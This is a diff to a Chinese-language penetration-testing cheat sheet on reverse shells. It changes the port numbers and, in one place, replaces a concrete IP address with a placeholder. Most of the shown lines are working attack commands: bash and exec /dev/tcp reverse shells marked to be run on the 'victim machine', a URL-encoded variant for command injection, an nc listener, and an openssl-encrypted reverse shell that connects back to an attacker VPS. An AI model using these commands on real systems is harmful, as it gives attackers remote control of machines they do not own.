@@ -4,12 +4,12 @@
 whereis bash nc python php exec perl ruby telnet
 
 用bash反弹shell：
-VPS上执行：nc -n -v -lp 4747
-受害机上执行：/bin/bash -i >& /dev/tcp/<your_vps>/4747 0>&1
-当在URL中进行命令注入利用时执行：/bin/bash -i %3E%26 /dev/tcp/xx.xx.xx.xx/4747 0%3E%261
+VPS上执行：nc -n -v -lp 1024
+受害机上执行：/bin/bash -i >& /dev/tcp/<your_vps>/1024 0>&1
+当在URL中进行命令注入利用时执行：/bin/bash -i %3E%26 /dev/tcp/xx.xx.xx.xx/1024 0%3E%261
 
 用exec反弹shell：
-0<&196;exec 196<>/dev/tcp/<your_vps>/4747; sh <&196 >&196 2>&196
+0<&196;exec 196<>/dev/tcp/<your_vps>/1024; sh <&196 >&196 2>&196
 
 其他反弹shell命令可通过浏览器插件Hack-Tools查看
 ```
@@ -36,7 +36,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 第二步，VPS监听反弹shell：
 openssl s_server -quiet -key key.pem -cert cert.pem -port 443
 第三步，受害机上用openssl加密反弹shell的流量：
-mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1|openssl s_client -quiet -connect 121.4.92.66 > /tmp/s;rm /tmp/s
+mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1|openssl s_client -quiet -connect xx.xx.xx.xx > /tmp/s;rm /tmp/s
 此时，VPS上成功获取哑shell
 ```
 将哑shell变为功能齐全的交互式shell
